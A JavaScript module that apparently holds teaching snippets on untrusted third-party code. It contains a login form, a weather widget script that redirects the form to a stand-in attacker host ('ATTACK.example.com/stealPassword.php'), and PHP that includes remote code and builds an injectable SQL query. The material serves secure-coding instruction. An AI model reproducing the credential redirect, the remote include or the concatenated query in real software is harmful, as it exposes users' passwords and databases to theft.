const code = {
  loginCode:`
<div class="header"> Welcome!
  <div id="loginBox">Please Login:
    <form id ="loginForm" name="loginForm" action="login.php" method="post">
    Username: <input type="text" name="username" />
    <br/>
    Password: <input type="password" name="password" />
    <input type="submit" value="Login" />
    </form>
  </div>
  <div id="WeatherWidget">
  <script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"></script>
  </div>
</div>`,
 jsCode: `
  ...Weather widget code....
  document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";`,
 phpDatabaseCredUploadCode:
 `
  //assume the password is already encrypted, avoiding CWE-312

  function authenticate($username,$password){

    include("http://external.example.com/dbInfo.php");

    //dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available
    mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');
    mysql_select_db($dbname);
    $query = 'Select * from users where username='.$username.' And password='.$password;
    $result = mysql_query($query);

    if(mysql_numrows($result) == 1){
      mysql_close();
      return true;
    } else {
      mysql_close();
      return false;
    }
  }`
}

export default code;
